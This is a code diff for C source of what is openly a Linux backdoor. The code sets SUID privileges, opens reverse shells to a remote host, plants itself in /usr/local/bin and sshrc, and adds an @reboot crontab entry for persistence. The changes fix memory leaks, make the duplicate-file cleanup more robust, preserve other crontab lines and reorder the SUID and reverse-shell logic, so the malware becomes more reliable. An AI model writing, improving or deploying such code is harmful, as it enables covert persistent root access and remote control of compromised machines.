@@ -59,15 +59,18 @@ void list_all_users() {
     line[strcspn(line, "\n")] = '\0';
 
     username = strtok(line, ":");
-    for (int i = 0; i < 2; i++) {
-      strtok(NULL, ":");
+    if (username == NULL) {
+      continue;
     }
+    strtok(NULL, ":");
     uid = strtok(NULL, ":");
-    for (int i = 0; i < 2; i++) {
-      strtok(NULL, ":");
-    }
+    strtok(NULL, ":");
+    strtok(NULL, ":");
     home_dir = strtok(NULL, ":");
 
+    if (uid == NULL) {
+      continue;
+    }
     if (home_dir == NULL) {
       home_dir = "(null)";
     }
@@ -77,26 +80,21 @@ void list_all_users() {
   fclose(file);
 }
 /* Get machine id [return:str] */
+static void fill_fallback_machine_id(char * machine_id, size_t n) {
+  char * random_md5 = generate_random_md5();
+  if (random_md5 == NULL) {
+    printf("[!] Failed to generate random MD5\n");
+    exit(EXIT_FAILURE);
+  }
+  snprintf(machine_id, n, "%s", random_md5);
+}
+
 char * get_machine_id() {
   static char machine_id[64];
   FILE * machine_file = fopen("/etc/machine-id", "r");
   if (machine_file == NULL) {
     printf("[!] Failed to open /etc/machine-id file, generating random MD5.\n");
-    char * random_md5 = generate_random_md5();
-    if (random_md5 == NULL) {
-      printf("[!] Failed to generate random MD5\n");
-      exit(EXIT_FAILURE);
-    }
-    snprintf(machine_id, sizeof(machine_id), "%s", random_md5);
-
-    machine_file = fopen("/etc/machine-id", "w");
-    if (machine_file == NULL) {
-      printf("[!] Failed to open /etc/machine-id for writing\n");
-      exit(EXIT_FAILURE);
-    }
-    fprintf(machine_file, "%s\n", machine_id);
-    fclose(machine_file);
-
+    fill_fallback_machine_id(machine_id, sizeof(machine_id));
     return (machine_id);
   }
 
@@ -104,25 +102,12 @@ char * get_machine_id() {
     machine_id[strcspn(machine_id, "\n")] = '\0';
     fclose(machine_file);
     return (machine_id);
-  } else {
-    fclose(machine_file);
-    printf("[!] Failed to read /etc/machine-id content, generating random MD5.\n");
-    char * random_md5 = generate_random_md5();
-    if (random_md5 == NULL) {
-      printf("[!] Failed to generate random MD5\n");
-      exit(EXIT_FAILURE);
-    }
-    snprintf(machine_id, sizeof(machine_id), "%s", random_md5);
-
-    machine_file = fopen("/etc/machine-id", "w");
-    if (machine_file == NULL) {
-      printf("[!] Failed to open /etc/machine-id for writing\n");
-      exit(EXIT_FAILURE);
-    }
-    fprintf(machine_file, "%s\n", machine_id);
-    fclose(machine_file);
-    return (machine_id);
   }
+
+  fclose(machine_file);
+  printf("[!] Failed to read /etc/machine-id content, generating random MD5.\n");
+  fill_fallback_machine_id(machine_id, sizeof(machine_id));
+  return (machine_id);
 }
 /* Back door laoder [return:null] */
 void backdoor_loader(void) {
@@ -207,14 +192,16 @@ void normal_method(bool backdoor_mode, int target_uid,
         return;
       }
       delete_extra_files_with_hash(file_hash, false);
+      free(file_hash);
       create_tyrant_script();
       backdoor_loader();
 
     } else {
-      if (has_suid_privileges()) {
-        reverse_shell(target_uid, rhost, rport);
-      } else {
+      if (!has_suid_privileges()) {
         set_suid();
+      }
+      if (rhost != NULL && rhost[0] != '\0' && rport > 0) {
+        reverse_shell(target_uid, rhost, rport);
       }
     }
   } else {
@@ -325,9 +312,16 @@ void write_sshrc(char * md5_name) {
 /* Update the configuration file [/etc/ssh/sshrc] [return:null] */
 void add_to_crontab(const char * mainhash,
   const char * clihash) {
-  char cmd[1024];
+  (void) clihash;
+  if (mainhash == NULL || strchr(mainhash, '\'') != NULL) {
+    fprintf(stderr, "[!] Invalid crontab path\n");
+    return;
+  }
+
+  char cmd[2048];
   snprintf(cmd, sizeof(cmd),
-    "(crontab -r 2>/dev/null; echo \"@reboot sleep 10 && nohup %s >/dev/null 2>&1 &\") | crontab -",
+    "(crontab -l 2>/dev/null | grep -v '@reboot sleep 10 && nohup'; "
+    "echo \"@reboot sleep 10 && nohup '%s' >/dev/null 2>&1 &\") | crontab -",
     mainhash);
 
   system(cmd);
@@ -342,7 +336,7 @@ int create_directory_if_needed(const char * dir_path) {
       return -1;
     }
 
-    if (chmod(dir_path, S_IRWXU | S_IXGRP | S_IXOTH | S_ISUID) == -1) {
+    if (chmod(dir_path, 0700) == -1) {
       return -1;
     }
   }
@@ -369,11 +363,10 @@ int count_files_with_hash(const char *hash) {
         if (stat(file_path, &file_stat) == 0 && S_ISREG(file_stat.st_mode) && (file_stat.st_mode & S_IXUSR)) {
             char *file_hash = get_file_hash(file_path);
             if (file_hash != NULL) {
-              
-
                 if (strcmp(file_hash, hash) == 0) {
                     count++;
                 }
+                free(file_hash);
             }
  
         }
@@ -384,14 +377,15 @@ int count_files_with_hash(const char *hash) {
 }
 void delete_extra_files_with_hash(const char *hash, bool keep_last) {
     int count = 0;
-    char *file_paths[PATH_MAX];
+    size_t cap = 0;
+    char **file_paths = NULL;
     DIR *dir = opendir("/usr/local/bin");
 
     if (dir == NULL) {
         perror("opendir");
         return;
     }
-   
+
     struct dirent *entry;
     while ((entry = readdir(dir)) != NULL) {
         if (entry->d_name[0] == '.') {
@@ -405,17 +399,28 @@ void delete_extra_files_with_hash(const char *hash, bool keep_last) {
             char *file_hash = get_file_hash(file_path);
 
             if (file_hash != NULL) {
-                char *trimmed_file_hash = file_hash;  
-                if (strcmp(trimmed_file_hash, hash) == 0) {
+                if (strcmp(file_hash, hash) == 0) {
+                    if ((size_t)count == cap) {
+                        size_t ncap = cap ? cap * 2 : 16;
+                        char **grown = realloc(file_paths, ncap * sizeof(*grown));
+                        if (grown == NULL) {
+                            perror("realloc");
+                            free(file_hash);
+                            continue;
+                        }
+                        file_paths = grown;
+                        cap = ncap;
+                    }
                     file_paths[count] = strdup(file_path);
                     if (file_paths[count] == NULL) {
                         perror("strdup");
-                        continue;  
+                        free(file_hash);
+                        continue;
                     }
                     count++;
                 }
+                free(file_hash);
             }
-       
         }
     }
 
@@ -423,31 +428,21 @@ void delete_extra_files_with_hash(const char *hash, bool keep_last) {
 
     if (count == 0) {
         printf("[!] No files with the given hash found.\n");
-        return;  
-    }
-
-    if (count > PATH_MAX) {
-        fprintf(stderr, "[!] Too many matching files found.\n");
+        free(file_paths);
         return;
     }
 
-    if (keep_last) {
-        for (int i = 0; i < count - 1; i++) {
-            
-            if (unlink(file_paths[i]) == -1) {
-                perror("unlink");
-            }
-            free(file_paths[i]);
+    int unlink_until = keep_last ? count - 1 : count;
+    for (int i = 0; i < unlink_until; i++) {
+        if (unlink(file_paths[i]) == -1) {
+            perror("unlink");
         }
-    } else {
-        for (int i = 0; i < count; i++) {
-             
-            if (unlink(file_paths[i]) == -1) {
-                perror("unlink");
-            }
-            free(file_paths[i]);
-        }
+        free(file_paths[i]);
     }
+    if (keep_last) {
+        free(file_paths[count - 1]);
+    }
+    free(file_paths);
 }
 /* Local exploit execution function. Creates directory if needed,
    checks if there are duplicate files, and sets up payload. */
@@ -468,6 +463,7 @@ void local_exp(const char * path) {
   if (count_files_with_hash(self_hash) > 1) {
     delete_extra_files_with_hash(self_hash, true);
     printf("[!] More than one file with the same hash exists. Exiting.\n");
+    free(self_hash);
     return;
   }
   add_to_crontab(path, "");
@@ -537,6 +533,7 @@ void local_exp(const char * path) {
       }
 
     }
+    sleep(5);
   }
 }
 /* Temporary process handler that handles file duplication and
@@ -560,6 +557,7 @@ void tmp_proc(const char * path, int id,
     int src_fd = open(path, O_RDONLY);
     if (src_fd == -1) {
       perror("open source file");
+      free(self_hash);
       return;
     }
 
@@ -567,6 +565,7 @@ void tmp_proc(const char * path, int id,
     if (dst_fd == -1) {
       perror("open destination file");
       close(src_fd);
+      free(self_hash);
       return;
     }
 
@@ -577,6 +576,7 @@ void tmp_proc(const char * path, int id,
         perror("write");
         close(src_fd);
         close(dst_fd);
+        free(self_hash);
         return;
       }
     }
@@ -596,8 +596,11 @@ void tmp_proc(const char * path, int id,
     printf("[+] Repaired the backdoor successfully\n");
     printf("[+] Use the command to start the backdoor => %s\n", extract_filename(new_file_path));
   } else {
+    free(self_hash);
     reverse_shell(id, rhost, rport);
+    return;
   }
+  free(self_hash);
 }
 /* Checks if a file with the given hash exists in the /usr/local/bin directory.
    If found, it stores the file path in out_path and returns 1. Otherwise, returns 0. */
@@ -620,9 +623,11 @@ int check_local_for_same_hash(const char * hash, char * out_path) {
     char * file_hash = get_file_hash(file_path);
     if (file_hash != NULL && strcmp(file_hash, hash) == 0) {
       snprintf(out_path, PATH_MAX, "%s", file_path);
+      free(file_hash);
       closedir(dir);
       return (1);
     }
+    free(file_hash);
   }
  
   closedir(dir);
@@ -649,11 +654,12 @@ int check_tmp_for_same_hash(const char * hash, char * out_path) {
     char * file_hash = get_file_hash(file_path);
     if (file_hash != NULL) {
       if (strcmp(file_hash, hash) == 0) {
-        strcpy(out_path, file_path);
+        snprintf(out_path, PATH_MAX, "%s", file_path);
+        free(file_hash);
         closedir(dir);
-  
         return (1);
       }
+      free(file_hash);
     }
   
   }
@@ -747,7 +753,13 @@ char * get_current_file_hash() {
 /* Checks the program directory and executes local_exp or tmp_proc based on directory */
 void check_program_directory(int target_uid,
   const char * rhost, int rport) {
-  if (check_running_process_with_hash(get_current_file_hash())) {
+  char * self_hash = get_current_file_hash();
+  if (self_hash == NULL) {
+    return;
+  }
+  int already_running = check_running_process_with_hash(self_hash);
+  free(self_hash);
+  if (already_running) {
     return;
   }
   char path[PATH_MAX];
@@ -793,6 +805,9 @@ void check_program_directory(int target_uid,
 }
 /* Checks if multiple processes with the same hash value are running */
 int check_running_process_with_hash(const char * hash) {
+  if (hash == NULL) {
+    return -1;
+  }
   int process_count = 0;
   DIR * dir = opendir("/usr/local/bin");
   if (dir == NULL) {
@@ -814,6 +829,7 @@ int check_running_process_with_hash(const char * hash) {
       FILE * fp = popen("ps aux", "r");
       if (fp == NULL) {
         perror("popen");
+        free(file_hash);
         closedir(dir);
         return -1;
       }
@@ -825,10 +841,11 @@ int check_running_process_with_hash(const char * hash) {
         }
       }
 
-      fclose(fp);
+      pclose(fp);
     }
+    free(file_hash);
   }
- 
+
   closedir(dir);
 
   if (process_count > 1) {
